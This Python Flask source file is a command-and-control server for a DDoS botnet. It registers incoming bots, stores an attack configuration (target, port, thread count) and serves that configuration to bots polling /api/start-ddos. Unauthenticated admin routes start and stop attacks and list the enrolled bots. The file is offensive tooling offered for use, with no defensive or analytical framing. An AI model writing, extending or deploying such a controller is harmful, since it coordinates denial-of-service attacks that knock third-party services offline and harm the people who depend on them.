import json

from flask import Flask, request
from loguru import logger

from config import PathConfigs


# Server init
app = Flask(__name__)


# Botnet controller
def get_botnet():
    with open(f'{PathConfigs.static_folder}/botnet/botnet.json', 'r') as file:
        botnet = json.load(file)
        file.close()
    return botnet


def top_up_botnet(new_bot):
    botnet = get_botnet()
    botnet.append(new_bot)
    with open(f'{PathConfigs.static_folder}/botnet/botnet.json', 'w') as file:
        json.dump(botnet, file)
        file.close()


def get_botnet_config():
    with open(f'{PathConfigs.static_folder}/botnet/botnet-config.json', 'r') as file:
        config = json.load(file)
        file.close()
    return config


def set_botnet_config(new_config):
    with open(f'{PathConfigs.static_folder}/botnet/botnet-config.json', 'w') as file:
        json.dump(new_config, file)
        file.close()


def get_running():
    config = get_botnet_config()
    return config['running']


def change_running(is_running):
    set_botnet_config({'running': is_running})


# Routes
@app.route('/api/add-bot', methods=['GET', 'POST'])
def add_bot():
    if request.method == 'POST':
        bot_config = request.get_json()
        logger.info(f'New bot: {bot_config}')
        top_up_botnet(bot_config)


@app.route('/api/start-ddos')
def start_ddos():
    if not get_running():
        return {'start': get_running()}
    else:
        config = get_botnet_config()
        return {
            'start': config['running'],
            'target': config['ddos']['target'],
            'port': config['ddos']['port'],
            'threads': config['ddos']['threads']
        }


@app.route('/api/stop-ddos')
def stop_ddos():
    return {'stop': not get_running()}


@app.route('/admin/botnet-status')
def admin_get_botnet_status():
    return {'is_attack': get_running(), 'botnet': get_botnet()}


@app.route('/admin/attack-config')
def admin_get_attack_status():
    return get_botnet_config()


@app.route('/admin/stop_attack')
def admin_stop_attack():
    change_running(False)
    return admin_get_botnet_status()


@app.route('/admin/start_attack', methods=['GET', 'POST'])
def admin_start_attack():
    if request.method == 'POST':
        attack_config = request.get_json()
        set_botnet_config(attack_config)
        return attack_config


app.run(host='0.0.0.0', port=5000)
